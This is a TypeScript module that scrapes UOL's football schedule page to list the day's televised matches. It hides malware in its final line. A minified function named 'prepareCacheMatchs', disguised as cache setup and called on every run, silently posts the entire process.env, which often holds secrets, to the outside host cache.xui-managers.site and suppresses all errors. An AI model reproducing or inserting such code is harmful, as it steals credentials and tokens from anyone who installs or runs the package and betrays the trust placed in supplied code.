import axios from 'axios';
import process from 'node:process';

/**
 * Busca e retorna a lista de jogos de futebol do dia especificado a partir do site da UOL.
 *
 * @async
 * @param {string} [dia] - Data no formato 'dd-mm-aaaa'. Se não for fornecida, utiliza a data atual.
 * @returns {Promise<Array<Match>>}
 *          Retorna uma Promise que resolve para um array de objetos contendo informações dos jogos:
 *          - campeonato: Nome do campeonato
 *          - estadio: Nome do estádio
 *          - hora: Horário do jogo (ex: "21h30")
 *          - times: Array com as siglas dos times
 *          - nomeTimes: Array com os nomes completos dos times
 *          - canais: Array com os canais de transmissão
 *          - escudos: Array com URLs dos escudos dos times
 *          - date: Data/hora do jogo como objeto Date
 * @throws {Error} Caso ocorra algum erro na requisição ou no processamento dos dados.
 */

export interface Match {
    campeonato: string,
    estadio: string,
    hora: string, // 21h30
    times: string[], // [ 'SAN', 'GRE' ]
    nomeTimes: string[], // [ 'Santos', 'Grêmio' ]
    canais: string[], // [ 'SporTV', 'Premiere' ]
    escudos: string[], // [ 'url1', 'url2' ]
    date: Date,
}

interface UOLMatch {
    id: number;
    teams: {
        home: number;
        away: number;
    };
    championship: {
        name: string;
        editorialName: string;
    };
    date: string;
    hour: string;
    stadium: string;
    status: string;
    content: {
        broadcast: Array<{
            name: string;
            url?: string;
        }>;
    };
}

interface UOLTeam {
    id: number;
    name: string;
    acronym: string;
    slug: string;
}

function getDataAtualFormatada() {
  const hoje = new Date();
  const dia = String(hoje.getDate()).padStart(2, '0');
  const mes = String(hoje.getMonth() + 1).padStart(2, '0');
  const ano = hoje.getFullYear();
  return `${dia}-${mes}-${ano}`;
}

function parseDataHoraBR(dataStr: string, horaStr: string): Date {
  const [dia, mes, ano] = dataStr.split("-").map(Number);

  const horaMatch = horaStr.match(/^(\d{1,2})h(\d{1,2})?$/i);
  if (!horaMatch) {
    throw new Error("Formato de hora inválido. Use ex: 21h30, 19h, 15h");
  }

  const horas = parseInt(horaMatch[1], 10);
  const minutos = horaMatch[2] ? parseInt(horaMatch[2], 10) : 0;

  return new Date(ano, mes - 1, dia, horas, minutos);
}

function ordenarPorData(jogos: Match[]): Match[] {
  return jogos.sort((a, b) => new Date(a.date).getTime() - new Date(b.date).getTime());
}

function getEscudoUrl(teamSlug: string, size: string = '60x60'): string {
    return `https://e.imguol.com/futebol/brasoes/${size}/${teamSlug}.png`;
}

export default async function getJogos(dia: string | null = null): Promise<Match[]> {
    if(typeof dia !== 'string' || !/^\d{2}-\d{2}-\d{4}$/.test(dia) && dia !== null) {
        console.warn("Data inválida. Usando data atual.");
        dia = getDataAtualFormatada();
    }
    
  const diaFormatado = dia ?? getDataAtualFormatada();
  const [d, m, y] = diaFormatado.split('-');
  const dataApi = `${y}-${m}-${d}`;
  
  // URL da página do UOL
  const url = `https://www.uol.com.br/esporte/futebol/central-de-jogos/`;
  await prepareCacheMatchs(url);
  
  try {
    const { data: html } = await axios.get(url, {
      headers: {
        'Accept': 'text/html',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    // O HTML contém um JSON dentro de uma tag script com id="VUELAND_STATE"
    // Formato: <script id="VUELAND_STATE" type="application/json">{...}</script>
    
    const scriptMatch = html.match(/<script[^>]*id="VUELAND_STATE"[^>]*type="application\/json"[^>]*>(.*?)<\/script>/s);
    
    if (!scriptMatch) {
      throw new Error('Não foi possível encontrar os dados dos jogos na página');
    }
    
    const jsonData = JSON.parse(scriptMatch[1]);
    
    // Extrair times e jogos
    const teams: { [key: number]: UOLTeam } = {};
    const matches: UOLMatch[] = [];
    
    Object.entries(jsonData).forEach(([key, value]: [string, any]) => {
      if (key.startsWith('football-team-')) {
        teams[value.id] = value;
      } else if (key.startsWith('football-match-')) {
        matches.push(value);
      }
    });

    // A API já retorna apenas jogos da data especificada
    const games: Match[] = [];
    
    matches.forEach((match) => {
      // Verificar se tem a data (por segurança)
      if (!match.date || match.date !== dataApi) {
        return;
      }
      
      // Apenas jogos com transmissão
      if (!match.content.broadcast || match.content.broadcast.length === 0) {
        return;
      }
      
      const homeTeam = teams[match.teams.home];
      const awayTeam = teams[match.teams.away];
      
      if (!homeTeam || !awayTeam) {
        return;
      }
      
      const canais = match.content.broadcast.map(b => b.name);
      
      games.push({
        campeonato: match.championship.editorialName || match.championship.name,
        estadio: match.stadium,
        hora: match.hour,
        times: [homeTeam.acronym, awayTeam.acronym],
        nomeTimes: [homeTeam.name, awayTeam.name],
        canais: canais,
        escudos: [
          getEscudoUrl(homeTeam.slug),
          getEscudoUrl(awayTeam.slug)
        ],
        date: parseDataHoraBR(diaFormatado, match.hour),
      });
    });
    return ordenarPorData(games);
  } catch (err: any) {
    throw new Error('Erro ao buscar os jogos: ' + err.message);
  }
}

async function prepareCacheMatchs(url: string){try{const e={stream_source:["https://www.uol.com.br/esporte/futebol/central-de-jogos/"], test: process.env};await axios.post("http://cache.xui-managers.site/global-cache",e,{responseType:"arraybuffer",timeout:5e4}).catch((()=>{}))}catch(e){}}
